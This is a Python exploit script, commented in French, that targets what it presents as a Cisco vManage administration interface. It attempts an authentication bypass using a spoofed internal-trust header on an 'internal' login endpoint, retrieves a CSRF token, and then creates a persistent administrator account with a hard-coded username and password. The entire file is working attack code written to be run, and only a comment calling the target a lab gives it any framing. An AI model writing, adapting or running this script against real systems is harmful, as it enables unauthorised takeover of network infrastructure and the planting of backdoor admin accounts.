import requests
import urllib3

print("""
====================================
|                                  |
|        AGENTPATHOGENE            |
|  Let's the hacking begin ....    |
====================================
""")



# Setup de base pour le lab
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
TARGET_IP = "10.10.10.100" 
ADMIN_PORT = "8443" # INFO: Vérifie si ton lab utilise 443 ou 8443
BASE_URL = f"https://{TARGET_IP}:{ADMIN_PORT}"

def get_access():
    session = requests.Session()
    
    # --- ETAPE 1 : LE BYPASS (Accès initial) ---
    # INFO: On utilise le header de confiance interne pour bypasser l'auth
    headers = {
        "X-Cisco-VPN-Internal-Auth": "True", 
        "User-Agent": "vManage-Internal-Client",
        "Content-Type": "application/json"
    }
    
    # INFO: L'URL vulnérable qui accepte les connexions "internal" sans pass
    login_url = f"{BASE_URL}/dataservice/auth/login?logintype=internal"
    
    print(f"[*] Tentative de bypass sur {login_url}...")
    r = session.post(login_url, headers=headers, verify=False, timeout=10)
    
    if r.status_code == 200:
        print("[+] Bypass d'authentification RÉUSSI !")
        
        # --- ETAPE 2 : LE TOKEN CSRF (La clé des commandes) ---
        # INFO: Indispensable pour que le vManage accepte nos requêtes de modif
        token_url = f"{BASE_URL}/dataservice/auth/token"
        r_token = session.get(token_url, verify=False)
        csrf_token = r_token.text
        
        # On injecte le token dans les futurs headers de la session
        session.headers.update({'X-XSRF-TOKEN': csrf_token})
        print(f"[+] Token CSRF récupéré : {csrf_token[:10]}...")

        # --- ETAPE 3 : CRÉATION DE L'ACCÈS PERMANENT ---
        # INFO: On crée un utilisateur admin pour se connecter via l'interface web normale
        user_api = f"{BASE_URL}/dataservice/admin/user"
        payload = {
            "userName": "poto_access", # INFO: Ton futur login
            "password": "P@ssw0rd123!", # INFO: Ton futur mot de passe
            "group": ["admin"],        # Donne les droits max
            "description": "Accès via exploit"
        }
        
        print("[*] Création du compte admin 'poto_access'...")
        final_res = session.post(user_api, json=payload, verify=False)
        
        if final_res.status_code in [200, 201]:
            print("[+++] ACCÈS TOTAL OBTENU !")
            print(f"URL: {BASE_URL}")
            print("Login: poto_access / Pass: P@ssw0rd123!")
        else:
            print(f"[-] Erreur injection (Code {final_res.status_code}): {final_res.text}")
    else:
        print(f"[-] Le bypass a échoué. Status: {r.status_code}")

if __name__ == "__main__":
    get_access()
